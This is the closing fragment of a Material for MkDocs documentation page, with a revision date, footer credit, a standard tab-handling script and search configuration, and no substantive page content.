    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 30, 2025</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.path", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.7389ff0e.min.js"></script>
      
    
  </body>
</html>